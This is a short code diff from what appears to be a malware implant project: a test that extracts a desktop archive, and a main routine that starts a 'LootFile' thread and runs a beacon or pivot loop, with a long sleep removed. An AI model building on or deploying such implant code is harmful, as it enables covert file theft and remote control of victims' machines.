@@ -2666,7 +2666,8 @@ void test152(void) {
 	WCHAR wszPath[] = L"D:\\App\\Dev Tools\\drltrace\\drltrace_src\\dynamorio\\clients\\drcachesim\\tests\\drmemtrace.threadsig.x64.tracedir\\drmemtrace.threadsig.10506.7343.trace.gz";
 
 	//ItemList = ExtractFromZip(wszPath, NULL, TRUE, &dwNumberOfItems);
-	ItemList = ExtractFromZip(L"C:\\Users\\Admin\\Desktop\\Mimi.7z", NULL, TRUE, &dwNumberOfItems);
+	ItemList = ExtractFromZip(L"C:\\Users\\Admin\\Desktop\\Mau_ngay_12-3.rar", NULL, TRUE, &dwNumberOfItems);
+	PrintFormatW(L"%d\n", dwNumberOfItems);
 }
 
 void test153(void) {
@@ -3039,7 +3040,6 @@ VOID Final(VOID)
 		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LootFile, pGlobalConfig, 0, &dwThreadId);
 	}
 	
-	Sleep(1000000000);
 	if (pGlobalConfig->Type == Beacon || pGlobalConfig->Type == Pivot) {
 		pBeaconClient = BeaconInit(pGlobalConfig);
 		BeaconMainLoop(pBeaconClient);
